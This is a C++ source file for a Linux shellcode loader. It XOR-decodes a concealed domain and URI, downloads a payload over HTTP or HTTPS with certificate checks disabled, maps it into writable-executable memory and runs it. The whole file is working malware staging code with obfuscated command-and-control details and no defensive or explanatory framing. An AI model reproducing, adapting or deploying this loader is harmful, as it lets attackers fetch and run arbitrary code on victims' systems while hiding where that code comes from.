#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/syscall.h>  

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

#include "cryptDef.h"


void XOR(char * data, size_t data_len, char * key, size_t key_len) 
{
	int j = 0;
	for (int i = 0; i < data_len; i++) 
	{
		if (j == key_len-1) 
			j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	
	data[data_len-1]='\0';
}


int main(int argc,char * argv[])
{
    XOR((char *) sDomain, sizeof(sDomain), XorKey, sizeof(XorKey));
	XOR((char *) sUri, sizeof(sUri), XorKey, sizeof(XorKey));

    if(isHttps)
    {
        httplib::SSLClient cli(sDomain, port);
        cli.enable_server_certificate_verification(false);

        auto res = cli.Get(sUri);

        int len = res->body.size();

        void * shellcode = mmap(0, len, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

        if(shellcode == MAP_FAILED)
        {
            perror("mmap failed");
            return -1;
        }
        
        memcpy(shellcode, res->body.data(), len);

        __clear_cache(shellcode, len + (char*)shellcode);
        ((void (*)()) shellcode)();
        return 0;
    }
    else
    {
        httplib::Client cli(sDomain, port);

        auto res = cli.Get(sUri);

        int len = res->body.size();

        void * shellcode = mmap(0, len, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

        if(shellcode == MAP_FAILED)
        {
            perror("mmap failed");
            return -1;
        }
        
        memcpy(shellcode, res->body.data(), len);

        __clear_cache(shellcode, len + (char*)shellcode);
        ((void (*)()) shellcode)();
        return 0;
    }

    return 0;
}
